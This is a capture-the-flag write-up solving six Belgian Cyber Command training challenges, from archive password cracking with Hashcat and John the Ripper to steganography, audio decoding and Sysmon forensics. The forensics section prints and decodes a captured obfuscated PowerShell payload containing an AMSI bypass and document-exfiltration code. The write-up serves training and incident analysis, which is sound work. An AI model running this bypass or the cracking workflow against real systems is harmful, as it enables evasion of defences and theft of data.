# Belgian Defence Cyber Command Capture The Flag Solutions
The Capture The Flag is available here: https://gitlab.com/cycom.edtrg/cyber-summerschool-2023

It's also available in this github under the zip file `cyber-summerschool-2023-master.zip`

![Belgian Cyber Command](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/cybercommand.png)

## Challenge 1- Cuban Pete

>Cuban Pete knows password strength is important. The password requirements for his vault are extra-secure and contain exactly one uppercase letter, one lowercase letter, one number and one special character... in that order.

>Total cracking time should not take more than half an hour.

This CTF is quite straight forward. A 7-zip file is provided, this file is encrypted and we need to find the proper password by attempting every possibilities.
We are informed that the password is 4 characters long.

There are two main brute force program available and widely known:
- John The Ripper : uses CPU power
- Hashcat : uses GPU power

To provide a complete solution we are going to use both of them but we do have a preference for Hashcat because it's **much** more faster!

Before attempting to brute force the password, we need to extract essential information from the provided `1-cuban-pete.7z` file.
This information is the password hashes from the encrypted file.

To extract this information you can use the program `zip2john` on Linux or you can use the web version of it at this URL: https://hashes.com/en/johntheripper/zip2john

You receives the following output that you can save as `pwdhash-cuban-pete.txt`:

`$7z$0$19$0$$8$84e0d69a5563177b0000000000000000$3476376437$112$106$31bf7cb2a1f17d9e338148797a3f3d4ee0bcde2bf359f96693921ffdfab116e0a5d2eb128a2dab8cff1ac3d655907eb6230d121690e8b4e20acee88010fce147f71f0335730e624e6aa07ff24599cc9e8a50742f9a80ba01c8d43215c0b2c16bee723d510eb27f6dcc8e154cbd0d750a`

With this hash we can now start our password brute force exercise:

Using John The Ripper on Linux type the following command: 

`sudo john --mask='?u?l?d?s' --min-length=4 --max-length=4 pwdhash-cuban-pete.txt`

Using Hashcat on Windows type the following command: 

`hashcat.exe -a 3 -m 11600 pwdhash-cuban-pete.txt ?u?l?d?s`

Both programs will retrieve the password: `Il5#`

Open the 7-Zip archive with this password and you can retrieve the first flag:

`CySS{Chick-Chicky-Boom}`

This whole challenge is a reference to the excellent movie "The Mask": https://www.youtube.com/watch?v=A8VqdhNnwdY

![SMOKIIIN](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/mask.png)



## Challenge 2- personal-secrets
>The Belgian General Information and Security Service (GISS) is keeping an important target under surveillance. Recently, their agents were able to intercept a USB drive that contained a password-encrypted file. They ask you if you can help them find the password and decrypt the file.
Some information, found by the GISS, is already available. The Service was able to retrieve a few passwords used by the target from leaked databases on the Web. None of these passwords worked out to decrypt the file. However, the GISS was able to identify a common pattern used by the target to choose his passwords: a name of a relative, followed by a year of birth, followed by a special character.

>For instance, these were passwords used by the target:
>- Marc1976$
>- Godelieve1987)
>- Francois2003+

>To help you crack the password, you will find attached a word list built exclusively for this target. The words listed are based on the context of the target (names of his teachers, names of relatives, of pets, etc.).

Here we go again! It's again a bruteforce approach but this time the password is much longer, complex but a list of name is provided to us and is named `2-wordlist.txt`

Opening this file you can clearly see that it's a standard list of name.

Having a closer look at the provided information you notice that the password `Francois2013+` **does not contain** the special character `ç` that should have been `François2013+`. This is clearly an indication that the target is using only non-latin characters in his password.

In other words it means that we need to first clean-up the provided name list of any latin characters `(é,ç,è,ï, ...)`.

At this point the easiest way is to open the text file `2-wordlist.txt` with `Notepad++` and use the replace function to replace `è=e, é=e, ç=c` and save the file.

Your `2-wordlist.txt` is now modified, it's time to generate a password dictionary from it by programing with some `Python`.

To generate this dictionary we will assume that the dates are between `[1950 - 2023]`. If it's incorrect we will adapt the dates.
Using the Python code provided above and named `2-dict-generator.py`, you will generate a password dictionary named: `dictCTF.txt`

Now, it's time to use either `John The Ripper` or `Hashcat`.

Retrieve, like on the first challenge, the necessary information from the 7-zip file using zip2john online and you will get the following hashes information:

`$7z$2$19$0$$8$f867dc9a2cd02c0e0000000000000000$2655098326$48$36$67ff1c69b28ccf0b54a2b98ff458d82301071a72c10a479e175ecd78627fc372a23e56c1c37a85eb92603aa5ad53891b$32$00`

We will now use hashcat due to its far better performance:

`hashcat.exe -a 0 -m 11600 pwdhash-personal-secrets.txt dictCTF.txt`

Hashcat will discover in less than 20sec that the correct password is: `Celine1992!`

You can now open the 7-zip file with the password and discover that the flag is:

`CySS{CorrectHorseBatteryStaple}`

This challenge is a reference to a famous password generator: https://www.correcthorsebatterystaple.net/index.html



## Challenge 3 - breakme
>Can you find the secret contained in this file?

>Each piece is sealed by its own name.

The challenges are getting interesting!
We are provided a file that seems odd, without any extension.
If you open this file with 7-Zip program you will see a file name contained in it `piece.7z.001`

Reading the challenge instruction you know that the password for this file is its own name `piece.7z.001`.
We extract this file and try to also open it with 7-Zip program and can see that the file contains a file named `piece.7z`.
We try to open this file but everything breaks down and we receive a message that the file is corrupted.

Something is strange. We know that 7-Zip archive have the capability to be splitted into multiple files to facilitate transfer of big files into smaller chunk.

The problem is that we only received **ONE** file and not multiple. Something is odd as we are looking at the file size:
- `3-breakme` = 2,41KB
- `piece.7z.001` = 16 bytes

There must be only one explanation. The provided file `3-breakme` is not **ONE** file but **MULTIPLE** files aggregated together and the reference to the file name `break me` is not to break the password but to cut the file in multiple files!

The only way to inspect a file is by going at the hexadecimal level.

For this, we are going to use Linux and use a program named `xxd`:

`xxd 3-breakme`

```
00000000: 377a bcaf 271c 0004 340a 5d83 2000 0000  7z..'...4.]. ...

...

...

000009a0: d901 1506 0100 2080 ff81 0000            ...... .....
```

If it's the first time you are doing this, you won't understand what all this is, but trust us, there is a lot to discover with this view.

First, we need to gather some information to move forward. Reading the 7-Zip documentation, we find that a 7-Zip file header structure is the following: http://fileformats.archiveteam.org/wiki/7z

This documentation tells us that the "Magic-Byte number" of a 7-Zip file is: `bcaf 271c`.

Knowing this, let's count the number of occurence of this "magic number" within the provided `3-breakme` using the following command:

`xxd 3-breakme | grep bcaf | wc -l`

This command returns that thare are 14 occurences of `bcaf`. In other words, it means that this file is an aggregation of 14 different 7-Zip files.

Excellent news, now that we know what this file is all about, it's time to extract them!

For this you can do it manually, as writing some code to do this wille takes you actually more time. Simply copy the hexadecimal code from the beginning `377a bcaf 271c` until the next occurence of this code. Then simply give it to `xxd` so that it will create a file from it for you.

Example for the first piece:

`echo '377a bcaf 271c 0004 340a 5d83 2000 0000
0000 0000 7200 0000 0000 0000 9e87 3d1f
7d75 5c7c bfec 6d35 b896 dc1e 99c2 1be4
fb0f cef6 7cd5 3eba 418c f234 507e 9fca
0104 0600 0109 2000 070b 0100 0224 06f1
0701 0a53 071d b255 5a43 9767 0021 2101
0001 000c 1410 0008 0a01 cb4a 57fd 0000
0501 1909 0000 0000 0000 0000 0011 1b00
7000 6900 6500 6300 6500 2e00 3700 7a00
2e00 3000 3000 3100 0000 1900 140a 0100
002b 0aa7 4d69 d901 1506 0100 2080 ff81
0000' | xxd -r -p > piece.7z.001`

Example for the second piece:

`echo '377a bcaf 271c 0004 4d8f 45e0 2000 0000
0000 0000 7200 0000 0000 0000 1af9 db6b
f43a b713 6b9f 9eac 20fc 764c a6fd a2bd
461d 3d0e 047f 21e7 7f52 0251 4fce 43c2
0104 0600 0109 2000 070b 0100 0224 06f1
0701 0a53 0785 e760 a006 2454 f921 2101
0001 000c 1410 0008 0a01 dfdc 17e6 0000
0501 1909 0000 0000 0000 0000 0011 1b00
7000 6900 6500 6300 6500 2e00 3700 7a00
2e00 3000 3000 3200 0000 1900 140a 0100
002b 0aa7 4d69 d901 1506 0100 2080 ff81
0000' | xxd -r -p > piece.7z.002`

and so on until you have all the 14 pieces of the 7zip file.
You can extract each file using the file name as the password.

At the end you will be able to open the file named `piece.7z` and open the text file that contains the flag:

`CySS{SometimesYouHaveBreakThingsToBuildSomethingBetter}`

This whole challenge is a reference to the japanese art named "Kintsugi": https://fr.wikipedia.org/wiki/Kintsugi

![Kintsugi](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/kintsugi.png)



## Challenge 4 - lemon.bmp
>Oops. I spilled my lemons and now I've lost the message on this piece of paper!

This challenge is a typical steganography challenge where a text is hidden within the image.
There are a lots of technics to hide a message within an image and a lots of technics to retrieve a message hidden in an image.
Sometimes it's more about using the correct tool.

Here, a fantastic tool exist and is dedicated to find information hidden within image. This software is named `stegsolve` and is written in Java.

Stegsolve documentation here: https://github.com/Giotino/stegsolve and https://www.aldeid.com/wiki/Stegsolve

On Linux we simply execute the following command after stegsolve installation:
`java -jar Stegsolve.jar`

Through the GUI, open the `lemon.bmp` file.

Click the `>` button until you reach the `Random colour map`.

![Lemonade.png](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/Lemonade.png)

You find that the flag is:

`CySS{MakeLemonade}`

**Easy pizzy lemon squizzy!**


## Challenge 5 - Bit Waves

## Wave A
>Decode the message! You might be able to do this one manually, but scripting this challenge will help you solve the others.

An excellent tool to perform audio analysis is named `Audacity`. It doesn't hurt to have a small look at it through Audacity and see what it's all about.

First, you should have a general look then ou will definitely need to zoom to have a better view.
Having a look at the different waves, it looks like the signal is composed of information pieces that are **8-bits long**.
You cannot find anything below 8-bits but you find multiple above.

![waveA.png](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/5-waveA.png)

We should definitely give a try at cutting and treat every information from this wave file as 8-bits.

For this we are going to write some Python code that will read the signal as chunk of 8-bits.

We need first to know what we will do with this information ... Well the simplest idea so far that comes to mind is to count the absence of signal as "0" and the presence of signal as "1".

In other words:
- each chunk of 8-bits without signal = 0
- each chunk of 8-bits with signal = 1

The Python code is available above and is named `5-bit-wave-A.py`. Run it against and it will transform the signal in a binary format.

`01000011011110010101001101010011011110110101001101111001011011100110001101100101011001000101010001101111010101000110100001100101010000110110110001101111011000110110101101111101`

This binary format is then transformed in ASCII text and you get the following flag:

`CySS{SyncedToTheClock}`



## Wave B
> Decode the message! Don't give up or your progress will return to zero.

This `5-waveB.wav` file is very different than the previous one.

In fact if we run our previous code against this challenge it just fails to give something that have any sense...

The good reflex here is to use again `Audacity` and search for a valuable pieve of information!

This piece of information is hidden! Hidden at the very end of the `5-waveB.wav` file. We see a last piece of data that is 4-bits long! Not 8-bits but 4-bits!

![5-waveB.png](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/5-waveB.png)

That makes the whole difference in data treatment!

Let's adapt our previous code so that it treats the data in piece of 4-bits instead of 8-bits.

`n_samples_per_packet = 8` into `n_samples_per_packet = 4`

Now let's have a look at the result:
`0001111111111001111001100111111000011110000001100001111000000110000110011000011000011110000111100001100111111111111000000000000111100111100110000001100000011111111000000001111111100111100110011110011000011001111001111001100000011110000110011110011111100001111000000001100111100111100110011110011001100001`

We get 2 additional information from this transformation:
- That's a very long byte code result
- it means nothing if we translate it into ASCII text

We need to think a little bit.

Such a long result for a flag is not completely abnormal but is at least odd. If we convert these 304 `0`s and `1`s it would give us a flag of 38 characters. That's big for a flag but is also possible.
That's a very thin lead to follow at the moment but let's keep this in mind.

Let's concentrate on ASCII text format.

We know that ASCII capital letter starts by the following 4-bits code:
- `0100`
- `0101`

ASCII non-capital letter starts with the following 4-bits code:
- `0110`
- `0111`

Based on this information we should try to work a little bit the two first bytes:
`0001 1111 1111 1001`.

After playing a little bit with it, the idea of selecting only 1 bit over 2 to create two different group of bits appears.

![onebitover2](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/5-waveB-bits.png)

We still cannot find a clear relation between any ASCII letter 4-bits code beginning but it still looks better now than the long suits of `0`s and `1`s we had before.

There is a quite famous operator that exists with bits and it's the `XOR` operator.

If we perform a `XOR` between our two different bits group we obtain the following:
```
     0011 1110
XOR  0111 1101
--------------
     0100 0011 = C

```

What a coincidence! A `XOR` between our two different bytes gives us a `"C"` the exact same first letter as every other flag so far.
We are doign the same with the second bytes group and we get a `"y"` as second letter.
It's time to adapt our python code and create the `5-bit-wave-B.py` script available above and give a try at this idea!

Let's run it and retrieve the flag:

`CySS{UpAndDownWeGo}`

Beautiful flag, lots of fun ! Thanks to the creator!



## Wave C
>Decode the message! We're back in sync but now there's even more data on the line.

This capture the flag instruction gives us a reference to the flag found in Wave-A.
That probably means that we are back to a normal 8-bits format instead of 4-bits format.

Having a look at the `5-waveC.wav` file with `Audactiy` we definitely see that there are more information in it than our previous files.

Analysing the code with python, it clearly appears that there are 4 types of frequency in it: `0Hz, 8kHz, 16kHz, 24kHz`

That's really problematic because we cannot convert 4 different type of values into a binary format directly. Does each frequency represent a packet of bits ? Is there noise added into the file ? Many other questions raises from this fact. Difficult to know.

Currently we will just adapt our python script to associate the a frquency with a different number in order to get a smaller view and try to work it out more easily:
-  `0Hz = 0`
-  `8kHz = 1`
-  `16kHz = 2`
-  `24kHz = 3`

This transformation gives us the following result:
`0203 3011 0211 2332 0202 0021 0202 0311 0211 2011 0200 3103 0213 1122 0203 2110 0210 2222 0212 0130 0203 0311 0211 3010 0210 2112 0212 0022 0212 3011 0201 3233 0213 1030 0213 0201 0200 3010 0210 2002 0212 0133 0202 3011 0211 3233 0212 0020 0213 0201 0210 3001 0210 2102 0212 0022 0212 2101`

As we know now that each flag starrts with a "C" it's time to also use this information usefuly. So, let's remember the ASCII coding of the `"C"` letter on 8-bits (`0100 0011`) and let's try to match it with the beginning of our previous result `0203 3011`.

```
0100 0011
0203 3011
---------
vxvx xvvv = over 8-bits we have a match of 5 bits, not that bad for a first lead.

v = match
x = no-match

```
Let's continue with the next group:

```
0111 1001 (=y)
0211 2332
---------
vxvv xxxx = over 8-bits, only 3 of them matches.

v = match
x = no-match

```

We are very close. In fact, if we look closely at the second group. We see that in order for `2332` to match `1001` we would need the `3` to be equal to `0` and the `2` to be equal to `1`.

If we replace the `3` by a `0` in our first group, that we assume to be a `"C"`, it would be a perfect match for the last part of the C-letter `3011 => 0011`!

What if the code is still a binary code, but there are two different ways to code `0` and `1` ?

What if we put the following hypothesis:
- `0 = 0 or 3 (0Hz or 24kHz)`
- `1 = 1 or 2 (8kHz or 16kHz)`

Let's try with our previous example:
- `0203 3011` => `0100 0011 = C`
- `0211 2332` => `0111 1001 = y`

That's it! We probably found the logic. Let's adapt our wave-A python script and let's create `5-bit-waveC.py`.

The execution of this script gives us the following flag: `CySS{DoNotCrossTheBitStreams}`

That's it, we finished all the wave CTF!


## Challenge 6 - Sysmon
>One of our employees noticed strange behaviour on his computer, and we think he might have been hacked. Luckily our sysadmin installed Sysmon a few minutes before the incident happened.
>Please find the answers to the following questions:
>1.	What suspicious domain did the host connect to?
>2.	What was the process that was most likely compromised?
>3.	What is the filename of the exfiltrated document?

With this challenge we are provided a file named `6-sysmon.evtx`.

This file is containing Windows Event Log that you can access on your own computer by `Event Viewer` application natively present on Windows.

You can simply double click on the file that windows will open for you.

The thing is that it's pretty difficult to investigate a big amount of data using `Event Viewer` meaning that it's going to be difficult to get a global pictures of what is happening because each event contains a lot of information.

To make oursleves in better investigation condition we are going to:
1. Export as XML format using `Event Viewer` all the provided Windows Event in `6-sysmon`
2. We are going to use an online XML beautifier to make it human readable like this one: https://codebeautify.org/xmlviewer or this one https://www.beautifyconverter.com/xml-beautifier.php

The XML file will help do dig deeper in interesting events.

We are also going to use `PowerShell`, as PowerShell embeds a powerful `cmdlet` named: `Get-WinEvent`.

From a forensics perspective, it's ALWAYS a good idea to first have a look at malicious activities. These malicious activities very oftenly involves usage of `cmd.exe`, `powershell.exe` through these, generally the first commands typed by a hacker are `whoami` or `hostname` as the hacker wants to identify the user he is impersonating to know if he needs to perform some privilege escalations or not. It's also interesting to have the machine name on which he is.

Based on that you can open the beautified XML file in `Notepad++` preferably and start scrolling through it just to familiarize with the content and data structure.

With everything we've said it's just time to write some PowerShell in order to retrieve what interest us:
- Time (UTC)
- Parent Command (to know which command has invoked which command)
- Parent Process Id (to establish process relations)
- Process Id (current process Id)
- Command Line (the command line used)
- Image (the binary used)
- Targeted File (if any)

Having these 7 informations at a high level can give us a pretty good pictures of what has happened on the computer.
As we are not going to display eveyrthing but only what could have interesting information we are going to print only the Windows Event that contains `command line` or have a `targeted file`.
We will also make a pretty nice display for our investigation by using the `Out-GridView` and `sort` eveything in chronological order.

For this matter you will find in the source the powershell code named: `6-sysmon-forensics.ps1`. Do not forget to modify the path of your file to `6-sysmon.evtx`.

Execute the PowerShell script and we will have the following: 

![Nasty web server](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/forensics-1.png)

![Nasty Nasty](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/forensics-2.png)

Thanks to this little PowerSHell script we can have a pretty clear view on what is happening here.

A local workstation that instanciate a local webserver, this workstation is not a developper workstation so this is clearly a suspicious and malicious activity. After this point we can clearly see the execution of commands!

A very intersting thing to notice is that the flag creator gives us a HUGE clue, the CVE used for this capture the flag. The CVE is: `CVE-2023-23397`.

A beautiful detailed article is available online regarding this vulnarability here: https://www.microsoft.com/en-us/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/

Reading this article and reviewing the powershell output you are able to establish the necessary links between the provided Windows Events and the exploit of this vulnerability.

Based on this we are able to start answering the different questions:

>1.	What suspicious domain did the host connect to?

The contacted domain is the true false domain: `update-cdn.uk.ms`
Which matches what is described in the Microsoft article:

![Domain](https://github.com/CyberLab-Thales-Belgium/CTF-BE-Cyber-Command/blob/main/images/forensics-3.png)

>2.	What was the process that was most likely compromised?

The whole Microsoft article is about a critical elevation of privileges through `OUTLOOK`. So the answer is Outlook.
Outlook, just needs to be opened and a reminder will trigger the payload.

Out of curiosity the process tree of the RCE coming from `svchost.exe` binaryis the following:
```
896  C:\Windows\System32\svchost.exe
  |-->  9248  C:\Windows\System32\wbem\WmiPrvSE.exe
		|--> 5208 C:\Windows\System32\cmd.exe
		|       |--> 3968  C:\Windows\System32\whoami.exe
		+--> 11168  C:\Windows\System32\cmd.exe
		|       |--> 7324  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
		+--> 7936  C:\Windows\System32\cmd.exe
		|       |--> 10268  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
		|--> 9896  C:\Windows\System32\cmd.exe
			   |--> 7940  C:\Windows\System32\shutdown.exe
```

>3.	What is the filename of the exfiltrated document? 

To answer this question we recommend that you go to the XML files and search for the executed command.

Extract and clean it up:

```
<Data Name='OriginalFileName'>PowerShell.EXE</Data>
      <Data Name='CommandLine'>powershell.exe  -exec bypass -noni -nop -w 1 -C "" $(set-iTEM 'vARiAbLe:oFS' '')"+[strInG]( '91H78&lt;101;116Z46w83;101l114U118w105k99l101;80Z111l105&lt;110k116;77w97l110P97Z103l101;114H93Z58;58U83H101w114Z118k101k114H67l101;114k116U105k102k105Z99Z97k116k101k86Z97Z108Z105U100k97Z116P105P111&lt;110Z67k97;108l108k98H97H99w107U32l61k32l123k36&lt;116H114l117l101k125w10H116k114l121w123&lt;10U91k82w101w102&lt;93k46&lt;65U115Z115k101H109;98w108k121l46P71Z101H116H84;121w112w101P40w39;83H121&lt;115w39k43w39U116U101w109P46H77P97w110P39k43Z39&lt;97H103w101w109k101;110;116Z46Z65P117U116U39;43k39U111k109U97k116P105;111&lt;110l46k65l109H39H43l39P115&lt;105&lt;85U116;39H43&lt;39;105U108l115P39H41H46l71k101U116U70l105k101l108H100k40P39k97;109Z39H43w39&lt;115k105k73w110k105k39w43Z39k116w70w97k105k108k101w100l39&lt;44w32&lt;39H78;111w110Z80H39Z43k39l117k98k108&lt;105k99&lt;44l83k116H97P39;43U39k116Z105&lt;99l39k41k46k83&lt;101H116U86w97U108H117k101Z40Z36Z110;117Z108U108Z44w32l36U116;114w117H101H41;10l125k99Z97Z116U99l104&lt;123U125U10k91k99P111k110Z118P101Z114l116w93H58Z58w84w111H66Z97P115;101H54k52l83k116w114&lt;105w110P103U40&lt;40U71&lt;101U116P45Z67l111k110Z116w101P110&lt;116w32H45l112k97k116&lt;104U32P34k67H58;92H85H115H101H114H115w92l103H97;115w116P111;110H46l108&lt;97H103H97k102k102w101w92U68H111k99;117H109P101l110;116l115w92&lt;76P65;85H78P67;72H32l67l79U68P69P83H32w40w67k76k65Z83P83w73l70U73P69U68&lt;41P46;100l111&lt;99U120P34Z32l45P69H110w99&lt;111w100&lt;105Z110k103w32P98H121&lt;116&lt;101H41P41'-sPlIT'w' -SPlit'P' -SpLIT 'l' -SPliT 'Z' -splIT'U' -SPlIT 'k' -SPlIt '&lt;'-sPLit 'H' -spLit'k'-SPLiT';' |fOrEacH{ ([cHar] [Int] $_)} ) +" $(SEt-ItEM  'vARIABLe:ofs' ' ') "|&amp;( $vERbOSePrefereNCe.TOstriNg()[1,3]+'X'-jOiN'')" </Data>
      <Data Name='CurrentDirectory'>C:\</Data>
      <Data Name='User'>QUICKEM-S7UTK0S\gaston.lagaffe</Data>
```
The code is obfuscated, you can notice the `-split` function at the end of the code.
Remove all the characters in the strange looking code that are given to a `-split` function and you obtain:

```
91 78 101 116 46 83 101 114 118 105 99 101 80 111 105 110 116 77 97 110 97 103 101 114 93 58 58 83 101 114 118 101 114 67 101 114 116 105 102 105 99 97 116 101 86 97 108 105 100 97 116 105 111 110 67 97 108 108 98 97 99 107 32 61 32 123 36 116 114 117 101 125 10 116 114 121 123 10 91 82 101 102 93 46 65 115 115 101 109 98 108 121 46 71 101 116 84 121 112 101 40 39 83 121 115 39 43 39 116 101 109 46 77 97 110 39 43 39 97 103 101 109 101 110 116 46 65 117 116 39 43 39 111 109 97 116 105 111 110 46 65 109 39 43 39 115 105 85 116 39 43 39 105 108 115 39 41 46 71 101 116 70 105 101 108 100 40 39 97 109 39 43 39 115 105 73 110 105 39 43 39 116 70 97 105 108 101 100 39 44 32 39 78 111 110 80 39 43 39 117 98 108 105 99 44 83 116 97 39 43 39 116 105 99 39 41 46 83 101 116 86 97 108 117 101 40 36 110 117 108 108 44 32 36 116 114 117 101 41 10 125 99 97 116 99 104 123 125 10 91 99 111 110 118 101 114 116 93 58 58 84 111 66 97 115 101 54 52 83 116 114 105 110 103 40 40 71 101 116 45 67 111 110 116 101 110 116 32 45 112 97 116 104 32 34 67 58 92 85 115 101 114 115 92 103 97 115 116 111 110 46 108 97 103 97 102 102 101 92 68 111 99 117 109 101 110 116 115 92 76 65 85 78 67 72 32 67 79 68 69 83 32 40 67 76 65 83 83 73 70 73 69 68 41 46 100 111 99 120 34 32 45 69 110 99 111 100 105 110 103 32 98 121 116 101 41 41
```
Transform these number into ASCII test using an online converter like this one: https://codebeautify.org/ascii-to-text

```
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
try{
[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
}catch{}
[convert]::ToBase64String((Get-Content -path "C:\Users\gaston.lagaffe\Documents\LAUNCH CODES (CLASSIFIED).docx" -Encoding byte))
```

You find that the leaked document is: `C:\Users\gaston.lagaffe\Documents\LAUNCH CODES (CLASSIFIED).docx`

Beautiful forensics capture the flag!

Cheers to Cyber Command :-)
